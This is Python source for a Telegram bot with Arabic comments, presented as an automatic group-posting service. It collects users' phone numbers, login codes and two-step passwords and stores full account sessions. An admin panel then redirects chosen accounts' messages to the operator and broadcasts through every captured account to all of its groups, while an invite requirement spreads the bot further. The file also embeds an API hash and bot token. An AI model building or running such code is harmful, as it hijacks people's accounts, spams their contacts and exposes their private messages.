import asyncio
import re
import os
from datetime import datetime, timedelta
from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors import SessionPasswordNeededError, FloodWaitError, ChatWriteForbiddenError

# إعدادات البوت
API_ID = 23656977
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
BOT_TOKEN = '8110119856:AAGtC5c8oQ1CA_FpGPQD0zg4ZArPunYSwr4'
MANDATORY_CHANNELS = ['crazys7', 'AWU87']
ADMIN_ID = 0  # ضع هنا آيدي المدير (رقمك)

# تخزين البيانات
sessions = {}
user_settings = {}
user_invites = {}
banned_users = set()
forwarding_chats = {}
active_posting = {}
admin_mode = {}

# تهيئة العميل
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def is_subscribed(user_id):
    """التحقق من اشتراك المستخدم في القنوات الإجبارية"""
    try:
        for channel in MANDATORY_CHANNELS:
            try:
                await bot(functions.channels.GetParticipantRequest(
                    channel=channel,
                    participant=user_id
                ))
            except ValueError:
                return False
        return True
    except:
        return False

async def send_main_menu(user_id):
    """إرسال القائمة الرئيسية"""
    buttons = [
        [types.KeyboardButton('تسجيل الدخول')],
        [types.KeyboardButton('إعداد النشر'), types.KeyboardButton('مساعده')]
    ]
    markup = types.ReplyKeyboardMarkup(buttons, resize=True)
    await bot.send_message(user_id, "**القائمة الرئيسية:**", buttons=markup)

async def send_posting_menu(user_id):
    """إرسال قائمة إعداد النشر"""
    buttons = [
        [types.KeyboardButton('الفاصل الزمني'), types.KeyboardButton('تعيين الكليشة')],
        [types.KeyboardButton('بدء النشر'), types.KeyboardButton('إيقاف النشر')],
        [types.KeyboardButton('الرجوع')]
    ]
    markup = types.ReplyKeyboardMarkup(buttons, resize=True)
    await bot.send_message(user_id, "**قائمة إعداد النشر:**", buttons=markup)

async def send_admin_menu(user_id):
    """إرسال قائمة المدير"""
    buttons = [
        [types.KeyboardButton('حظر مستخدم'), types.KeyboardButton('فك حظر مستخدم')],
        [types.KeyboardButton('سحب رقم'), types.KeyboardButton('إرسال إشعار')],
        [types.KeyboardButton('بث عام'), types.KeyboardButton('الخروج من وضع المدير')]
    ]
    markup = types.ReplyKeyboardMarkup(buttons, resize=True)
    await bot.send_message(user_id, "**قائمة المدير:**", buttons=markup)

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """معالج أمر البداية"""
    user_id = event.sender_id
    
    # التحقق من حظر المستخدم
    if user_id in banned_users:
        return
    
    # التحقق من الاشتراك الإجباري
    if not await is_subscribed(user_id):
        channels_text = "\n".join([f"@{channel}" for channel in MANDATORY_CHANNELS])
        await event.respond(f"**يجب الاشتراك في القنوات التالية أولاً:**\n{channels_text}")
        return
    
    # التحقق من رابط الدعوة
    if 'invite_' in event.raw_text:
        inviter_id = int(event.raw_text.split('_')[1])
        if inviter_id in user_invites and user_id not in user_invites[inviter_id]:
            if await is_subscribed(user_id):
                user_invites[inviter_id].add(user_id)
                await event.respond(f"**تم قبول دعوتك بواسطة {inviter_id}**")
                await bot.send_message(inviter_id, f"**تمت إضافة دعوة جديدة! لديك الآن {len(user_invites[inviter_id])}/5 دعوات**")
    
    # التحقق من حالة المستخدم
    if user_id not in sessions:
        await send_main_menu(user_id)
    else:
        invites_count = len(user_invites.get(user_id, set()))
        if invites_count < 5:
            invite_link = f"t.me/{(await bot.get_me()).username}?start=invite_{user_id}"
            await event.respond(f"**يجب دعوة {5-invites_count} أشخاص آخرين لاستخدام البوت**\nرابط الدعوة:\n`{invite_link}`")
        else:
            await send_main_menu(user_id)

@bot.on(events.NewMessage(func=lambda e: e.text == 'تسجيل الدخول'))
async def login_handler(event):
    """معالج تسجيل الدخول"""
    user_id = event.sender_id
    
    # التحقق من وجود جلسة سابقة
    if user_id in sessions:
        await event.respond("**أنت مسجل بالفعل!**")
        return
    
    # بدء عملية التسجيل
    sessions[user_id] = {'step': 'phone'}
    await event.respond("**أرسل رقم هاتفك الدولي (مثال: +20123456789):**")

@bot.on(events.NewMessage(func=lambda e: e.text == 'مساعده'))
async def help_handler(event):
    """معالج المساعدة"""
    help_text = """
    **دليل استخدام البوت:**
    1. تسجيل الدخول: إضافة حسابك التلجرام
    2. إعداد النشر: ضبط إعدادات النشر التلقائي
    3. الفاصل الزمني: تحديد الوقت بين كل نشر (3 دقائق كحد أدنى)
    4. تعيين الكليشة: تحديد الرسالة التي سيتم نشرها
    5. بدء النشر: تشغيل النظام التلقائي
    6. إيقاف النشر: إيقاف النظام التلقائي
    
    **ملاحظات:**
    - كود التحقق يُرسل بهذه الصيغة: 1 2 3 4 5
    - يجب دعوة 5 أشخاص بعد التسجيل
    - عند وجود خطأ في مجموعة، يتم تخطيها تلقائياً
    """
    await event.respond(help_text)

@bot.on(events.NewMessage(func=lambda e: e.text == 'إعداد النشر'))
async def posting_setup_handler(event):
    """معالج إعداد النشر"""
    user_id = event.sender_id
    
    # التحقق من اكتمال الدعوات
    if user_id not in sessions or len(user_invites.get(user_id, set())) < 5:
        await event.respond("**يجب إكمال 5 دعوات أولاً!**")
        return
    
    # تهيئة الإعدادات إذا لم تكن موجودة
    if user_id not in user_settings:
        user_settings[user_id] = {
            'interval': 5,  # دقائق
            'message': "رسالة النشر الافتراضية",
            'groups': []
        }
    
    await send_posting_menu(user_id)

@bot.on(events.NewMessage(func=lambda e: e.text == 'الفاصل الزمني'))
async def interval_handler(event):
    """معالج الفاصل الزمني"""
    user_id = event.sender_id
    await event.respond("**أرسل الفاصل الزمني بالدقائق (3 دقائق كحد أدنى):**")
    sessions[user_id] = {'step': 'set_interval'}

@bot.on(events.NewMessage(func=lambda e: e.text == 'تعيين الكليشة'))
async def message_handler(event):
    """معالج تعيين الرسالة"""
    user_id = event.sender_id
    await event.respond("**أرسل الرسالة التي تريد نشرها:**")
    sessions[user_id] = {'step': 'set_message'}

@bot.on(events.NewMessage(func=lambda e: e.text == 'بدء النشر'))
async def start_posting_handler(event):
    """بدء النشر التلقائي"""
    user_id = event.sender_id
    
    if user_id not in user_settings:
        await event.respond("**الرجاء تعيين الإعدادات أولاً!**")
        return
    
    # إعداد قائمة المجموعات
    if not user_settings[user_id]['groups']:
        client = TelegramClient(
            StringSession(sessions[user_id]['session']), 
            API_ID, 
            API_HASH
        )
        await client.connect()
        
        dialogs = await client.get_dialogs()
        groups = [dialog.id for dialog in dialogs if dialog.is_group]
        user_settings[user_id]['groups'] = groups
        await client.disconnect()
    
    # بدء عملية النشر
    active_posting[user_id] = True
    await event.respond(f"**تم بدء النشر بفاصل {user_settings[user_id]['interval']} دقائق**")
    
    # تشغيل النشر في الخلفية
    asyncio.create_task(auto_poster(user_id))

@bot.on(events.NewMessage(func=lambda e: e.text == 'إيقاف النشر'))
async def stop_posting_handler(event):
    """إيقاف النشر التلقائي"""
    user_id = event.sender_id
    if user_id in active_posting:
        active_posting[user_id] = False
        await event.respond("**تم إيقاف النشر التلقائي**")

@bot.on(events.NewMessage(func=lambda e: e.text == 'الرجوع'))
async def back_handler(event):
    """العودة للقائمة الرئيسية"""
    await send_main_menu(event.sender_id)

# معالج الرسائل العامة
@bot.on(events.NewMessage)
async def handle_messages(event):
    user_id = event.sender_id
    text = event.text
    
    # التحقق من حظر المستخدم
    if user_id in banned_users:
        return
    
    # أوامر المدير
    if text == '/admin' and user_id == ADMIN_ID:
        admin_mode[user_id] = True
        await send_admin_menu(user_id)
        return
    
    if user_id in admin_mode:
        await handle_admin_commands(event)
        return
    
    # معالجة الخطوات المتسلسلة
    if user_id not in sessions:
        return
    
    step = sessions[user_id].get('step')
    
    # معالجة رقم الهاتف
    if step == 'phone':
        if not re.match(r'^\+\d{11,14}$', text):
            await event.respond("**رقم غير صحيح! أرسل الرقم بالصيغة الدولية (مثال: +20123456789):**")
            return
        
        sessions[user_id]['phone'] = text
        sessions[user_id]['step'] = 'code'
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(text)
            sessions[user_id]['client'] = client
            sessions[user_id]['phone_code_hash'] = sent.phone_code_hash
            await event.respond("**تم إرسال كود التحقق. أرسله بالصيغة: 1 2 3 4 5**")
        except FloodWaitError as e:
            await event.respond(f"**انتظر {e.seconds} ثانية قبل المحاولة مرة أخرى**")
    
    # معالجة كود التحقق
    elif step == 'code':
        if not re.match(r'^\d(\s?\d){4}$', text):
            await event.respond("**صيغة غير صحيحة! أرسل الكود بالصيغة: 1 2 3 4 5**")
            return
        
        code = text.replace(' ', '')
        client = sessions[user_id]['client']
        try:
            await client.sign_in(
                phone=sessions[user_id]['phone'],
                code=code,
                phone_code_hash=sessions[user_id]['phone_code_hash']
            )
            sessions[user_id]['session'] = client.session.save()
            await event.respond("**تم تسجيل الدخول بنجاح!**")
            
            # إنشاء رابط الدعوة
            invite_link = f"t.me/{(await bot.get_me()).username}?start=invite_{user_id}"
            user_invites[user_id] = set()
            await event.respond(f"**يجب دعوة 5 أشخاص لاستخدام البوت**\nرابط الدعوة:\n`{invite_link}`")
            
            # إغلاق اتصال العميل المؤقت
            await client.disconnect()
            del sessions[user_id]['client']
        except SessionPasswordNeededError:
            sessions[user_id]['step'] = 'password'
            await event.respond("**أدخل كلمة المرور الثنائية:**")
        except:
            await event.respond("**كود غير صحيح! حاول مرة أخرى:**")
    
    # معالجة كلمة المرور الثنائية
    elif step == 'password':
        client = sessions[user_id]['client']
        try:
            await client.sign_in(password=text)
            sessions[user_id]['session'] = client.session.save()
            await event.respond("**تم تسجيل الدخول بنجاح!**")
            
            # إنشاء رابط الدعوة
            invite_link = f"t.me/{(await bot.get_me()).username}?start=invite_{user_id}"
            user_invites[user_id] = set()
            await event.respond(f"**يجب دعوة 5 أشخاص لاستخدام البوت**\nرابط الدعوة:\n`{invite_link}`")
            
            # إغلاق اتصال العميل المؤقت
            await client.disconnect()
            del sessions[user_id]['client']
        except:
            await event.respond("**كلمة مرور خاطئة! حاول مرة أخرى:**")
    
    # معالجة الفاصل الزمني
    elif step == 'set_interval':
        try:
            interval = int(text)
            if interval < 3:
                await event.respond("**الحد الأدنى 3 دقائق!**")
                return
            user_settings[user_id]['interval'] = interval
            await event.respond(f"**تم تعيين الفاصل الزمني إلى {interval} دقائق**")
            del sessions[user_id]
            await send_posting_menu(user_id)
        except:
            await event.respond("**القيمة غير صالحة! أرسل رقمًا صحيحًا**")
    
    # معالجة الرسالة
    elif step == 'set_message':
        user_settings[user_id]['message'] = text
        await event.respond("**تم تعيين الرسالة بنجاح!**")
        del sessions[user_id]
        await send_posting_menu(user_id)

async def auto_poster(user_id):
    """النشر التلقائي في المجموعات"""
    session_str = sessions[user_id]['session']
    settings = user_settings[user_id]
    message = settings['message']
    interval = settings['interval']
    groups = settings['groups'].copy()
    
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    
    while user_id in active_posting and active_posting[user_id]:
        failed_groups = []
        
        for group_id in groups:
            if not active_posting.get(user_id, False):
                break
                
            try:
                await client.send_message(group_id, message)
                await asyncio.sleep(10)  # فاصل بين المجموعات
            except (ChatWriteForbiddenError, ValueError):
                failed_groups.append(group_id)
            except FloodWaitError as e:
                await bot.send_message(user_id, f"**تم حظرك مؤقتًا لمدة {e.seconds} ثانية**")
                await asyncio.sleep(e.seconds)
        
        # إزالة المجموعات الفاشلة
        for group_id in failed_groups:
            if group_id in groups:
                groups.remove(group_id)
        
        # تحديث القائمة في الإعدادات
        user_settings[user_id]['groups'] = groups
        
        # الانتظار للفاصل الزمني الرئيسي
        if active_posting.get(user_id, False):
            await asyncio.sleep(interval * 60)
    
    await client.disconnect()

async def handle_admin_commands(event):
    """معالجة أوامر المدير"""
    user_id = event.sender_id
    text = event.text
    
    if text == 'الخروج من وضع المدير':
        del admin_mode[user_id]
        await send_main_menu(user_id)
        return
    
    if text == 'حظر مستخدم':
        await event.respond("**أرسل آيدي المستخدم لحظره:**")
        admin_mode[user_id] = 'ban_user'
        return
    
    if text == 'فك حظر مستخدم':
        await event.respond("**أرسل آيدي المستخدم لفك حظره:**")
        admin_mode[user_id] = 'unban_user'
        return
    
    if text == 'سحب رقم':
        # عرض أول 10 حسابات
        accounts = list(sessions.keys())[:10]
        buttons = [[types.KeyboardButton(str(acc))] for acc in accounts]
        buttons.append([types.KeyboardButton('التالي'), types.KeyboardButton('الرجوع')])
        markup = types.ReplyKeyboardMarkup(buttons, resize=True)
        await event.respond("**اختر حسابًا لسحب رقمه:**", buttons=markup)
        admin_mode[user_id] = 'select_account'
        return
    
    if text == 'إرسال إشعار':
        await event.respond("**أرسل الرسالة التي تريد إرسالها لجميع المستخدمين:**")
        admin_mode[user_id] = 'send_notification'
        return
    
    if text == 'بث عام':
        await event.respond("**أرسل الرسالة التي تريد بثها لجميع الحسابات والمجموعات:**")
        admin_mode[user_id] = 'global_broadcast'
        return
    
    # معالجة الأوامر المتسلسلة
    if admin_mode[user_id] == 'ban_user':
        try:
            target_id = int(text)
            banned_users.add(target_id)
            await event.respond(f"**تم حظر المستخدم {target_id}**")
            del admin_mode[user_id]
        except:
            await event.respond("**آيدي غير صالح!**")
    
    elif admin_mode[user_id] == 'unban_user':
        try:
            target_id = int(text)
            if target_id in banned_users:
                banned_users.remove(target_id)
                await event.respond(f"**تم فك حظر المستخدم {target_id}**")
            else:
                await event.respond("**المستخدم غير محظور!**")
            del admin_mode[user_id]
        except:
            await event.respond("**آيدي غير صالح!**")
    
    elif admin_mode[user_id] == 'select_account':
        if text == 'التالي':
            # التمرير للصفحة التالية (التنفيذ الكامل يتطلب تخزين حالة الصفحة)
            await event.respond("**الميزة قيد التطوير**")
            return
        
        try:
            account_id = int(text)
            if account_id in sessions:
                # بدء توجيه الرسائل
                forwarding_chats[account_id] = user_id
                await event.respond(f"**سيتم توجيه رسائل الحساب {account_id} إليك**")
                del admin_mode[user_id]
            else:
                await event.respond("**الحساب غير موجود!**")
        except:
            await event.respond("**اختيار غير صالح!**")
    
    elif admin_mode[user_id] == 'send_notification':
        # إرسال الإشعار لجميع المستخدمين
        for uid in sessions.keys():
            try:
                await bot.send_message(uid, f"**إشعار من الإدارة:**\n\n{text}")
            except:
                pass
        await event.respond("**تم إرسال الإشعار لجميع المستخدمين**")
        del admin_mode[user_id]
    
    elif admin_mode[user_id] == 'global_broadcast':
        # البث لجميع الحسابات والمجموعات
        for uid, data in sessions.items():
            try:
                client = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
                await client.connect()
                
                # إرسال للمستخدم الشخصي
                await client.send_message(uid, f"**بث عام:**\n\n{text}")
                
                # إرسال لجميع المجموعات
                dialogs = await client.get_dialogs()
                for dialog in dialogs:
                    if dialog.is_group:
                        try:
                            await client.send_message(dialog.id, text)
                            await asyncio.sleep(1)
                        except:
                            continue
                
                await client.disconnect()
            except:
                continue
        
        await event.respond("**تم البث العام بنجاح**")
        del admin_mode[user_id]

# توجيه الرسائل للمدير
@bot.on(events.NewMessage(incoming=True))
async def handle_incoming_messages(event):
    for account_id, admin_id in forwarding_chats.items():
        if event.sender_id == account_id:
            await bot.send_message(admin_id, f"**رسالة من {account_id}:**\n\n{event.text}")

async def main():
    await bot.start()
    print("تم تشغيل البوت بنجاح!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
